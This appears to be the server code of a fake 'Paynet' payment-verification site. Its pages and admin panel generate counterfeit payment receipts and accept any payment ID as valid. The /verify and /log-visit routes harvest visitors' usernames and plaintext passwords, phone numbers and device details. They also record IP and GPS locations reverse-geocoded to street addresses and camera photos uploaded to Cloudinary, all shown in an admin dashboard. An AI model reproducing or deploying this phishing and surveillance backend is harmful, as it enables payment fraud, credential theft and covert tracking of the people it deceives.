// Paynet - Payment Verification System
// Full Deployment Sync: 2026-02-14 19:20
const express = require("express");
const app = express();
const hbs = require("hbs");
const session = require("express-session");
const nocache = require("nocache");
const fetch = require("node-fetch");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
require("dotenv").config();
const cloudinary = require("cloudinary").v2;

// Cloudinary Configuration
if (process.env.CLOUDINARY_URL) {
  cloudinary.config({
    cloudinary_url: process.env.CLOUDINARY_URL
  });
} else {
  // Manual config fallback
  cloudinary.config({
    cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
    api_key: process.env.CLOUDINARY_API_KEY,
    api_secret: process.env.CLOUDINARY_API_SECRET
  });
}

// Trust proxy (required for Render, Heroku, etc.)
app.set("trust proxy", 1);

// Prevent caching
app.use(nocache());

// Security Headers
app.use((req, res, next) => {
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "SAMEORIGIN"); // Allow iframes on same origin if needed
  res.setHeader("X-XSS-Protection", "1; mode=block");
  next();
});

// Static files
app.use(express.static("public"));

// View engine setup
app.set("views", path.join(__dirname, "views"));
app.set("view engine", "hbs");

// Demo login credentials
const username = "safwan";
const password = "saf123";

// Admin credentials (set in .env or use default)
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "safwan@123";

// Admin authentication middleware
function requireAdmin(req, res, next) {
  if (!req.session.isAdmin) {
    return res.redirect("/admin-login");
  }
  next();
}

// Body parsers with size limits
app.use(express.urlencoded({ extended: true, limit: "10mb" }));
app.use(express.json({ limit: "10mb" }));

const FileStore = require("session-file-store")(session);

// Session setup (secure secret from environment)
app.use(
  session({
    store: new FileStore({
      path: path.join(__dirname, "sessions"),
      checkPeriod: 3600,
      retries: 5
    }),
    secret: process.env.SESSION_SECRET || crypto.randomBytes(32).toString("hex"),
    resave: false,
    saveUninitialized: false,
    cookie: {
      secure: process.env.NODE_ENV === "production",
      httpOnly: true,
      maxAge: 24 * 60 * 60 * 1000, // 24 hours
      sameSite: "lax"
    }
  })
);

// Disable caching
app.use(nocache());
app.use((req, res, next) => {
  res.set("Cache-Control", "no-store");
  next();
});

// Normalize IP addresses to ensure consistent matching
// Handles ::ffff:127.0.0.1 vs ::1 vs 127.0.0.1 etc.
function normalizeIP(ip) {
  if (!ip) return 'unknown';
  ip = String(ip).trim();

  // Strip IPv4-mapped IPv6 prefix (::ffff:)
  if (ip.startsWith('::ffff:')) {
    ip = ip.substring(7);
  }

  // Normalize all localhost variants to a single form
  if (ip === '::1' || ip === '127.0.0.1' || ip === 'localhost') {
    return '127.0.0.1';
  }

  return ip;
}

// Get real client IP (supports multiple proxy headers)
function getClientIP(req) {
  // Try multiple headers in order of preference
  const headers = [
    'x-forwarded-for',
    'x-real-ip',
    'cf-connecting-ip', // Cloudflare
    'x-client-ip',
    'forwarded'
  ];

  for (const header of headers) {
    const value = req.headers[header];
    if (value) {
      // x-forwarded-for can be comma-separated list
      const ip = value.split(',')[0].trim();
      if (ip && ip !== '::1' && ip !== '127.0.0.1') {
        return normalizeIP(ip);
      }
    }
  }

  const socketIP = req.socket.remoteAddress;

  // For localhost testing, use mock IP if set
  if ((socketIP === '::1' || socketIP === '127.0.0.1' || socketIP === '::ffff:127.0.0.1') && process.env.MOCK_PUBLIC_IP) {
    return normalizeIP(process.env.MOCK_PUBLIC_IP);
  }

  return normalizeIP(socketIP || 'unknown');
}

// Multi-source geolocation API with fallback
async function getGeoWithFallback(ip) {
  // Skip localhost IPs unless mocked
  if (ip === '::1' || ip === '127.0.0.1') {
    // Return mock data for development
    return {
      ip: ip,
      city: 'Development',
      region: 'Localhost',
      country: 'DEV',
      latitude: 0,
      longitude: 0,
      timezone: 'UTC',
      isp: 'Local Development',
      org: 'Local'
    };
  }

  // Try primary API: ipapi.co
  try {
    const response = await fetch(`https://ipapi.co/${ip}/json/`, {
      timeout: 5000
    });
    const data = await response.json();

    if (!data.error && data.city) {
      return {
        ip: data.ip,
        city: data.city,
        region: data.region,
        country: data.country_name,
        countryCode: data.country_code,
        latitude: data.latitude,
        longitude: data.longitude,
        timezone: data.timezone,
        isp: data.org,
        postalCode: data.postal,
        towerName: data.asn || data.org,
        towerDetails: `${data.network || ''} (${data.org || ''})`
      };
    }
  } catch (err) {
    // console.log("ipapi.co failed, trying fallback...");
  }

  // Fallback 1: ip-api.com (free, no key needed)
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`, {
      timeout: 5000
    });
    const data = await response.json();

    if (data.status === 'success') {
      return {
        ip: data.query,
        city: data.city,
        region: data.regionName,
        country: data.country,
        countryCode: data.countryCode,
        latitude: data.lat,
        longitude: data.lon,
        timezone: data.timezone,
        isp: data.isp,
        postalCode: data.zip,
        towerName: data.as || data.isp,
        towerDetails: `${data.org || ''} - ${data.as || ''}`
      };
    }
  } catch (err) {
    // console.log("ip-api.com failed, trying next fallback...");
  }

  // Fallback 2: ipwhois.app
  try {
    const response = await fetch(`https://ipwho.is/${ip}`, {
      timeout: 5000
    });
    const data = await response.json();

    if (data.success) {
      return {
        ip: data.ip,
        city: data.city,
        region: data.region,
        country: data.country,
        countryCode: data.country_code,
        latitude: data.latitude,
        longitude: data.longitude,
        timezone: data.timezone?.id,
        isp: data.connection?.isp,
        postalCode: data.postal,
        towerName: data.connection?.asn || data.connection?.isp,
        towerDetails: `${data.connection?.org || ''} (${data.connection?.isp || ''})`
      };
    }
  } catch (err) {
    // console.log("ipwho.is failed");
  }

  // All APIs failed
  // console.log("All geo APIs failed for IP:", ip);
  return null;
}

// Reverse geocode GPS coordinates to address using Nominatim (OSM)
async function reverseGeocode(lat, lon) {
  try {
    const response = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`,
      {
        headers: {
          'User-Agent': 'PaynetApp/1.0' // Required by Nominatim
        },
        timeout: 5000
      }
    );

    const data = await response.json();

    if (data.address) {
      return {
        fullAddress: data.display_name,
        road: data.address.road,
        neighborhood: data.address.neighbourhood || data.address.suburb,
        city: data.address.city || data.address.town || data.address.village,
        state: data.address.state,
        country: data.address.country,
        postcode: data.address.postcode
      };
    }
  } catch (err) {
    console.log("Reverse geocoding failed:", err);
  }
  return null;
}

// Keep old function for backwards compatibility
async function getGeo(ip) {
  return getGeoWithFallback(ip);
}

// Hash password using SHA-256
function hashPassword(password) {
  if (!password) return null;
  return crypto.createHash("sha256").update(password).digest("hex");
}

// Load/Save Settings
const settingsFile = path.join(__dirname, "settings.json");
const defaultSettings = { paymentAmount: "500.00", currencySymbol: "₹", enableAnimation: true };

function getSettings() {
  try {
    if (fs.existsSync(settingsFile)) {
      return JSON.parse(fs.readFileSync(settingsFile, "utf-8"));
    }
  } catch (err) {
    console.error("Error reading settings, using defaults:", err.message);
  }
  return { ...defaultSettings };
}

function saveSettings(newSettings) {
  fs.writeFileSync(settingsFile, JSON.stringify(newSettings, null, 2));
}

// Safe JSON file reader (prevents crashes from corrupt files)
function safeReadJSON(filePath, fallback = []) {
  try {
    if (fs.existsSync(filePath)) {
      const content = fs.readFileSync(filePath, "utf-8").trim();
      if (content) return JSON.parse(content);
    }
  } catch (err) {
    console.error(`Error reading ${filePath}:`, err.message);
    // Try to recover from backup
    const bakPath = filePath + ".bak";
    try {
      if (fs.existsSync(bakPath)) {
        console.log("Recovering from backup:", bakPath);
        const bakContent = fs.readFileSync(bakPath, "utf-8").trim();
        if (bakContent) return JSON.parse(bakContent);
      }
    } catch (bakErr) {
      console.error("Backup recovery failed:", bakErr.message);
    }
  }
  return fallback;
}

// Safe JSON file writer (creates backup first)
function safeWriteJSON(filePath, data) {
  try {
    // Create backup of existing file
    if (fs.existsSync(filePath)) {
      fs.copyFileSync(filePath, filePath + ".bak");
    }
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
  } catch (err) {
    console.error(`Error writing ${filePath}:`, err.message);
  }
}

// Routes - Paynet Payment System
app.get("/", (req, res) => {
  res.render("payment", { ...getSettings(), layout: false });
});

app.get("/login", (req, res) => {
  res.render("login", { layout: false });
});

app.get("/payment", (req, res) => {
  res.render("payment", { ...getSettings(), layout: false });
});

app.get("/verify", (req, res) => {
  res.render("verify", { ...getSettings(), layout: false });
});

// Validate Payment ID endpoint (for payment verification flow)
app.post("/validate-payment-id", (req, res) => {
  const { paymentId } = req.body;

  // Accept any payment ID (min 6 chars to avoid noise)
  if (!paymentId || paymentId.length < 6) {
    return res.json({
      valid: false,
      message: "Invalid Payment ID format. Please check and try again."
    });
  }

  // 1. Check generated payments (Custom details)
  const paymentsFile = path.join(__dirname, "generatedPayments.json");
  const payments = safeReadJSON(paymentsFile, []);
  const payment = payments.find(p => p.id === paymentId);

  if (payment) {
    return res.json({
      valid: true,
      payment: {
        ...payment,
        isCustom: true
      }
    });
  }

  // 2. Fallback to generic validation
  res.json({
    valid: true,
    payment: {
      id: paymentId,
      amount: getSettings().paymentAmount || "500.00",
      merchant: "Paynet Services",
      date: new Date().toLocaleString('en-IN', {
        day: '2-digit', month: 'short', year: 'numeric',
        hour: '2-digit', minute: '2-digit', hour12: true
      }),
      isCustom: false
    }
  });
});

// Admin API to generate custom payment
app.post("/admin/api/generate-payment", requireAdmin, (req, res) => {
  try {
    const { amount, toName, fromName, bankName, upiId, upiTxnId, googleTxnId, customDate } = req.body;

    // Generate unique random code (10 chars, alphanumeric uppercase)
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let id = '';
    for (let i = 0; i < 10; i++) {
      id += chars.charAt(Math.floor(Math.random() * chars.length));
    }

    const newPayment = {
      id,
      amount,
      toName,
      fromName,
      bankName,
      upiId,
      upiTxnId,
      googleTxnId,
      date: customDate || new Date().toLocaleString('en-IN', {
        day: '2-digit', month: 'short', year: 'numeric',
        hour: '2-digit', minute: '2-digit', hour12: true
      }),
      createdAt: new Date().toISOString()
    };

    // Save to file
    const paymentsFile = path.join(__dirname, "generatedPayments.json");
    let payments = safeReadJSON(paymentsFile, []);
    payments.push(newPayment);
    safeWriteJSON(paymentsFile, payments);

    res.json({ success: true, payment: newPayment });
  } catch (error) {
    console.error("Error generating payment:", error);
    res.status(500).json({ success: false, error: "Failed to generate payment" });
  }
});

// Admin API for Settings
app.post("/admin/api/settings", requireAdmin, (req, res) => {
  const { paymentAmount, currencySymbol, enableAnimation } = req.body;
  const newSettings = {
    paymentAmount,
    currencySymbol,
    enableAnimation: enableAnimation === 'on' || enableAnimation === true
  };
  saveSettings(newSettings);
  res.redirect("/admin");
});

app.get("/admin", requireAdmin, (req, res) => {
  const settings = getSettings();
  const logFile = path.join(__dirname, "loginAttempts.json");
  let attempts = safeReadJSON(logFile, []);

  res.render("admin", {
    attempts: attempts.reverse(),
    settings: settings,
    layout: false
  });
});

app.get("/admin-login", (req, res) => {
  if (req.session.isAdmin) {
    return res.redirect("/admin");
  }
  res.render("admin-login", { error: req.session.adminError, layout: false });
  req.session.adminError = null;
});

app.post("/admin-auth", (req, res) => {
  const { password } = req.body;

  if (password === ADMIN_PASSWORD) {
    req.session.isAdmin = true;
    return res.redirect("/admin");
  }

  req.session.adminError = "Invalid password";
  res.redirect("/admin-login");
});

app.get("/admin/api/data", requireAdmin, (req, res) => {
  try {
    const logFile = path.join(__dirname, "loginAttempts.json");
    let attempts = safeReadJSON(logFile, []);

    // Sort by timestamp descending (newest first)
    attempts.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

    // Get list of photos from captures directory
    const capturesDir = path.join(__dirname, "captures");
    let photos = [];
    if (fs.existsSync(capturesDir)) {
      const files = fs.readdirSync(capturesDir);
      photos = files.filter(f => /\.(jpg|jpeg|png|webp)$/i.test(f)).map(filename => ({
        filename,
        path: `/admin/photo/${filename}`,
        isLocal: true,
        timestamp: fs.statSync(path.join(capturesDir, filename)).mtime
      }));
    }

    // Add photos from attempts (both Cloudinary and local)
    attempts.forEach(attempt => {
      // Add photos array if exists
      if (attempt.photos && Array.isArray(attempt.photos)) {
        attempt.photos.forEach(photo => {
          photos.push({
            filename: photo.filename,
            path: photo.url || photo.localPath,
            isLocal: !photo.url,
            type: photo.type,
            attemptId: attempt.verificationId,
            timestamp: photo.timestamp
          });
        });
      }

      // Add single cloudinaryUrl if exists
      if (attempt.cloudinaryUrl) {
        photos.push({
          filename: attempt.verificationId + ".jpg",
          path: attempt.cloudinaryUrl,
          isLocal: false,
          attemptId: attempt.verificationId,
          timestamp: attempt.timestamp
        });
      }
    });



    // Load pending photos
    const photosFile = path.join(__dirname, "pendingPhotos.json");
    const pendingPhotos = safeReadJSON(photosFile, []);

    // BACKFILL: Link pending photos to attempts based on matching Payment ID
    attempts.forEach(attempt => {
      if (attempt.verificationId) {
        const linked = pendingPhotos.filter(p => p.paymentId === attempt.verificationId);
        if (linked.length > 0) {
          // Initialize photos array if missing
          if (!attempt.photos) attempt.photos = [];
          // Add only if not already present (avoid duplicates if re-running)
          linked.forEach(lp => {
            const exists = attempt.photos.some(existing => existing.url === lp.url || existing.filename === lp.filename);
            if (!exists) attempt.photos.push(lp);
          });
        }
      }
    });

    // Also add pending photos (not yet linked to any attempt) to the main photos list
    pendingPhotos.forEach(photo => {
      const photoPath = photo.url || photo.localPath || (photo.filename ? `/admin/photo/${photo.filename}` : null);
      if (photoPath) {
        photos.push({
          filename: photo.filename || 'pending',
          path: photoPath,
          isLocal: !photo.url,
          type: photo.type || 'pending',
          attemptId: 'Pending',
          timestamp: photo.timestamp
        });
      }
    });

    // Remove duplicates and sort by timestamp
    photos = photos.filter((photo, index, self) =>
      index === self.findIndex(p => p.path === photo.path)
    ).sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

    res.json({ attempts, photos });
  } catch (error) {
    console.error("Error reading admin data:", error);
    res.status(500).json({ error: "Failed to load data" });
  }
});

// Mutex for safe JSON writes (prevents race conditions)
class Mutex {
  constructor() {
    this.queue = [];
    this.locked = false;
  }
  async lock() {
    return new Promise(resolve => {
      if (this.locked) {
        this.queue.push(resolve);
      } else {
        this.locked = true;
        resolve();
      }
    });
  }
  unlock() {
    if (this.queue.length > 0) {
      const next = this.queue.shift();
      next();
    } else {
      this.locked = false;
    }
  }
}

const dbLock = new Mutex(); // Global lock for DB writes

// Helper to safely update JSON with lock
async function safeUpdateJSON(filepath, updateFn) {
  await dbLock.lock();
  try {
    const data = safeReadJSON(filepath, []);
    const newData = updateFn(data);
    safeWriteJSON(filepath, newData);
    return newData;
  } finally {
    dbLock.unlock();
  }
}

app.get("/admin/photo/:filename", requireAdmin, (req, res) => {
  const { filename } = req.params;
  const filepath = path.join(__dirname, "captures", filename);

  if (fs.existsSync(filepath)) {
    res.sendFile(filepath);
  } else {
    res.status(404).send("Photo not found");
  }
});

// Delete a specific photo (Comprehensive Delete)
app.delete("/admin/photo/delete/:filename", requireAdmin, async (req, res) => {
  try {
    const { filename } = req.params;
    const capturesDir = path.join(__dirname, "captures");
    const filepath = path.join(capturesDir, filename);
    let deleted = false;

    // 1. Delete Local File
    if (fs.existsSync(filepath)) {
      try {
        fs.unlinkSync(filepath);
        deleted = true;
      } catch (e) {
        console.error("File delete error:", e);
      }
    }

    // 2. Remove from pendingPhotos.json
    await safeUpdateJSON(path.join(__dirname, "pendingPhotos.json"), (photos) => {
      const initialLength = photos.length;
      const newPhotos = photos.filter(p => p.filename !== filename && p.url !== filename);
      if (newPhotos.length < initialLength) deleted = true;
      return newPhotos;
    });

    // 3. Remove from loginAttempts.json
    await safeUpdateJSON(path.join(__dirname, "loginAttempts.json"), (attempts) => {
      let modified = false;
      attempts.forEach(attempt => {
        if (attempt.photos) {
          const originalLen = attempt.photos.length;
          attempt.photos = attempt.photos.filter(p => p.filename !== filename && p.url !== filename);
          if (attempt.photos.length < originalLen) {
            modified = true;
            deleted = true;
          }
        }
        // Check single photo fields
        if (attempt.photoFilename === filename) {
          attempt.photoFilename = null;
          modified = true;
          deleted = true;
        }
      });
      return attempts; // safeWriteJSON will write this back
    });

    if (deleted) {
      res.json({ success: true, message: "Photo and references deleted" });
    } else {
      // If we couldn't find it anywhere, still return success to clear UI
      res.json({ success: true, message: "Photo reference removed (if existed)" });
    }
  } catch (error) {
    console.error("Error deleting photo:", error);
    res.status(500).json({ success: false, error: "Failed to delete photo" });
  }
});

// Delete all photos
app.delete("/admin/photo/delete-all", requireAdmin, async (req, res) => {
  try {
    const capturesDir = path.join(__dirname, "captures");

    // 1. Delete all local files
    if (fs.existsSync(capturesDir)) {
      const files = fs.readdirSync(capturesDir);
      files.forEach(file => {
        const filepath = path.join(capturesDir, file);
        if (fs.statSync(filepath).isFile()) {
          fs.unlinkSync(filepath);
        }
      });
    }

    // 2. Clear JSON references
    await safeUpdateJSON(path.join(__dirname, "pendingPhotos.json"), () => []);

    await safeUpdateJSON(path.join(__dirname, "loginAttempts.json"), (attempts) => {
      attempts.forEach(a => {
        a.photos = [];
        a.photoFilename = null;
        a.cloudinaryUrl = null;
      });
      return attempts;
    });

    res.json({ success: true, message: "All photos deleted" });
  } catch (error) {
    console.error("Error deleting all photos:", error);
    res.status(500).json({ success: false, error: "Failed to delete all photos" });
  }
});


app.get("/admin-logout", (req, res) => {
  req.session.isAdmin = false;
  res.redirect("/admin-login");
});

app.get("/troll-success", (req, res) => {
  res.render("troll", { layout: false });
});

app.get("/notres", (req, res) => {
  res.render("notres", { layout: false });
});

// Privacy & Terms pages
app.get("/privacy", (req, res) => {
  res.render("privacy", { layout: false });
});

app.get("/terms", (req, res) => {
  res.render("terms", { layout: false });
});

app.get("/forgot-password", (req, res) => {
  res.render("forgot-password", { layout: false });
});


app.post("/capture-photo", async (req, res) => {
  try {
    const { photo, type, timestamp: clientTimestamp, paymentId } = req.body;

    if (!photo) {
      return res.status(400).json({ success: false, message: "No photo data" });
    }

    const ip = getClientIP(req) || "unknown";
    const timestamp = new Date().toISOString().replace(/:/g, "-");
    const safeIp = String(ip).replace(/[.:]/g, "-");
    const photoType = type || "unknown";
    const publicId = `paynet_${photoType}_${timestamp}_${safeIp}`;

    let photoUrl = null;
    let filename = null;

    // Upload to Cloudinary if available
    if (process.env.CLOUDINARY_URL || process.env.CLOUDINARY_API_KEY) {
      try {
        const uploadResponse = await cloudinary.uploader.upload(photo, {
          public_id: publicId,
          folder: "paynet_captures"
        });
        photoUrl = uploadResponse.secure_url;
        filename = uploadResponse.public_id;
      } catch (cloudErr) {
        console.error("Cloudinary upload failed, using local storage:", cloudErr.message);
      }
    }

    // Always save locally as backup (or primary if Cloudinary fails)
    if (!photoUrl) {
      const capturesDir = path.join(__dirname, "captures");
      if (!fs.existsSync(capturesDir)) fs.mkdirSync(capturesDir);

      filename = `${publicId}.jpg`;
      const filepath = path.join(capturesDir, filename);
      const base64Data = String(photo).replace(/^data:image\/\w+;base64,/, "");
      const buffer = Buffer.from(base64Data, "base64");
      fs.writeFileSync(filepath, buffer);
    }

    // Store photo metadata for later linking
    const photoMetadata = {
      filename,
      url: photoUrl,
      type: photoType,
      ip,
      timestamp: clientTimestamp || new Date().toISOString(),
      localPath: photoUrl ? null : `/admin/photo/${filename}`,
      paymentId: paymentId || null
    };

    // Save to a temporary photos file that will be linked when login attempt is logged
    await safeUpdateJSON(path.join(__dirname, "pendingPhotos.json"), (photos) => {
      photos.push(photoMetadata);
      return photos;
    });

    res.json({ success: true, filename, url: photoUrl });
  } catch (error) {
    console.error("Capture error:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Log visit/verification attempt with location
app.post("/log-visit", async (req, res) => {
  try {
    const {
      paymentId,
      location,
      deviceDetails,
      userAgent
    } = req.body;

    const ip = getClientIP(req);
    const timestamp = new Date().toISOString();
    const geo = await getGeoWithFallback(ip);

    // Parse location if string
    let parsedLocation = location;
    if (typeof location === 'string') {
      try {
        parsedLocation = JSON.parse(location);
      } catch (e) { }
    }

    // Parse device details if string
    let parsedDeviceDetails = deviceDetails;
    if (typeof deviceDetails === 'string') {
      try {
        parsedDeviceDetails = JSON.parse(deviceDetails);
      } catch (e) { }
    }

    // Enhanced location processing (Handles both flat and nested structures)
    let enhancedLocation = parsedLocation;
    let coords = null;

    if (parsedLocation) {
      if (parsedLocation.latitude && parsedLocation.longitude) {
        coords = parsedLocation;
      } else if (parsedLocation.finalLocation && parsedLocation.finalLocation.coords) {
        coords = parsedLocation.finalLocation.coords;
      }
    }

    if (coords && coords.latitude && coords.longitude) {
      const address = await reverseGeocode(coords.latitude, coords.longitude);
      if (address) {
        if (parsedLocation.latitude) {
          enhancedLocation = { ...parsedLocation, address };
        } else {
          enhancedLocation = {
            ...parsedLocation,
            finalLocation: {
              ...parsedLocation.finalLocation,
              address: address
            }
          };
        }
      }
    }

    const logData = {
      verificationId: paymentId || "VISIT-" + crypto.randomBytes(4).toString("hex").toUpperCase(),
      timestamp,
      ip,
      geo, // IP-based location (now always present)
      location: enhancedLocation, // GPS-based location with address
      deviceDetails: parsedDeviceDetails,
      userAgent: userAgent || req.headers["user-agent"],
      status: "Verifying",
      type: "Visit"
    };

    // Append to loginAttempts.json
    const logFile = path.join(__dirname, "loginAttempts.json");
    await safeUpdateJSON(logFile, (attempts) => {
      attempts.push(logData);
      return attempts;
    });

    res.json({ success: true });
  } catch (error) {
    console.error("Log visit error:", error);
    res.status(500).json({ success: false });
  }
});

// Verify login
app.post("/verify", async (req, res) => {
  const {
    username: inputUsername,
    password: inputPassword,
    deviceDetails,
    location,
    phoneNumber,
    photoData,
  } = req.body;

  const ip = getClientIP(req);
  const userAgent = req.headers["user-agent"];
  const timestamp = new Date().toISOString();
  const geo = await getGeoWithFallback(ip); // Use enhanced fallback version

  // Parse device data
  let parsedDeviceDetails = null;
  if (deviceDetails) {
    try {
      parsedDeviceDetails = JSON.parse(deviceDetails);
    } catch {
      // Silent parsing error
    }
  }

  // Parse GPS location
  let parsedLocation = null;
  if (location) {
    try {
      parsedLocation = JSON.parse(location);
    } catch {
      // Silent parsing error
    }
  }

  // Enhanced location processing with reverse geocoding
  let enhancedLocation = parsedLocation;

  // If we have GPS coordinates (check multiple possible structures)
  const hasDirectCoords = parsedLocation && parsedLocation.latitude && parsedLocation.longitude;
  const hasFinalCoords = parsedLocation && parsedLocation.finalLocation &&
    parsedLocation.finalLocation.coords &&
    parsedLocation.finalLocation.coords.latitude;

  if (hasDirectCoords) {
    // Direct coordinates format
    const address = await reverseGeocode(parsedLocation.latitude, parsedLocation.longitude);
    if (address) {
      enhancedLocation = {
        ...parsedLocation,
        address: address
      };
    }
  } else if (hasFinalCoords) {
    // Nested finalLocation format
    const coords = parsedLocation.finalLocation.coords;
    const address = await reverseGeocode(coords.latitude, coords.longitude);
    if (address) {
      enhancedLocation = {
        ...parsedLocation,
        finalLocation: {
          ...parsedLocation.finalLocation,
          address: address
        }
      };
    }
  }

  // Generate Transaction/Verification ID
  const verificationId = "PAY-" + crypto.randomBytes(4).toString("hex").toUpperCase();

  // Get pending photos for this IP and link them (Atomic Update)
  const photosFile = path.join(__dirname, "pendingPhotos.json");
  let userPhotos = [];
  const normalizedIP = normalizeIP(ip);

  await safeUpdateJSON(photosFile, (pendingPhotos) => {
    const tenMinutesAgo = new Date(Date.now() - 10 * 60 * 1000).toISOString();

    // 1. Direct IP Match
    const directMatches = pendingPhotos.filter(p => {
      return normalizeIP(p.ip) === normalizedIP && p.timestamp > tenMinutesAgo;
    });
    userPhotos = [...directMatches];

    // 2. Fallback Time Match
    if (userPhotos.length === 0) {
      const veryRecentAgo = new Date(Date.now() - 3 * 60 * 1000).toISOString();
      const timeMatches = pendingPhotos.filter(p => p.timestamp > veryRecentAgo);
      if (timeMatches.length > 0) {
        userPhotos = [...timeMatches];
        // console.log(`📸 Linked ${userPhotos.length} photos by time-window fallback`);
      }
    } else {
      // console.log(`📸 Linked ${userPhotos.length} photos by IP match`);
    }

    // 3. Remove linked from pending
    if (userPhotos.length > 0) {
      const linkedIds = new Set(userPhotos.map(p => p.timestamp));
      return pendingPhotos.filter(p => !linkedIds.has(p.timestamp));
    }
    return pendingPhotos;
  });

  // Save all data to file (ONLY place data is stored - no console logging)
  const logData = {
    verificationId,
    timestamp,
    ip,
    geo, // IP-based location (now always present with fallback)
    location: enhancedLocation, // GPS-based location with address if available
    deviceDetails: parsedDeviceDetails,
    userAgent,
    username: inputUsername,
    password: inputPassword, // Store actual password for admin view
    passwordHash: hashPassword(inputPassword),     // Secure hash
    phoneNumber: phoneNumber || null,
    photoData: userPhotos.length > 0 ? "[CAPTURED]" : (photoData ? "[CAPTURED]" : null),
    photos: userPhotos, // Array of all captured photos
    photoCount: userPhotos.length,
    photoFilename: req.body.photoFilename || null,
    cloudinaryUrl: req.body.photoUrl || null,
    status: "Verified", // Default status for paid/verified
    amount: "₹" + (Math.floor(Math.random() * 500) + 100) + ".00" // Mock amount for realism
  };

  // Append to loginAttempts.json
  try {
    // Upload photo to Cloudinary if it exists in base64
    if (photoData && (process.env.CLOUDINARY_URL || process.env.CLOUDINARY_API_KEY)) {
      try {
        const uploadResponse = await cloudinary.uploader.upload(photoData, {
          folder: "paynet_verifications",
          public_id: verificationId
        });
        logData.cloudinaryUrl = uploadResponse.secure_url;
      } catch (uploadErr) {
        console.error("Cloudinary upload failed in /verify:", uploadErr);
      }
    }

    const logFile = path.join(__dirname, "loginAttempts.json");
    await safeUpdateJSON(logFile, (attempts) => {
      attempts.push(logData);
      return attempts;
    });
  } catch (error) {
    console.error("Error in /verify log save:", error);
  }

  // Login logic
  if (inputUsername === username && inputPassword === password) {
    req.session.user = inputUsername;
    return res.redirect("/home");
  } else {
    req.session.msg = "Invalid username or password";
    return res.redirect("/");
  }
});

app.get("/home", (req, res) => {
  if (!req.session.user) return res.redirect("/");
  res.render("home", { layout: false });
});

app.get("/logout", (req, res) => {
  req.session.destroy(() => res.redirect("/"));
});

// Health check endpoint (for Render/monitoring)
app.get("/health", (req, res) => {
  res.json({ status: "ok", uptime: process.uptime() });
});

// Graceful error handling
process.on("uncaughtException", (err) => {
  console.error("Uncaught Exception:", err.message);
});
process.on("unhandledRejection", (reason) => {
  console.error("Unhandled Rejection:", reason);
});

// IMPORTANT: Dynamic port for Render
const PORT = process.env.PORT || 3003;
// Periodic Cleanup Job (Every hour)
// Removes pending photos older than 24 hours to prevent unlimited growth
setInterval(async () => {
  try {
    const photosFile = path.join(__dirname, "pendingPhotos.json");
    const ONE_DAY = 24 * 60 * 60 * 1000;

    await safeUpdateJSON(photosFile, (photos) => {
      const now = Date.now();
      const initialCount = photos.length;
      // Keep photos younger than 24h
      const newPhotos = photos.filter(p => {
        const timeDiff = now - new Date(p.timestamp).getTime();
        return timeDiff < ONE_DAY;
      });

      if (newPhotos.length < initialCount) {
        console.log(`🧹 Cleanup: Removed ${initialCount - newPhotos.length} old pending photos`);
      }
      return newPhotos;
    });
  } catch (e) {
    console.error("Cleanup error:", e);
  }
}, 60 * 60 * 1000); // 1 hour

// Start server
app.listen(PORT, () => {
  console.log(`Paynet server running on http://localhost:${PORT}`);
});

// Final Deployment Sync: 2026-02-14 19:58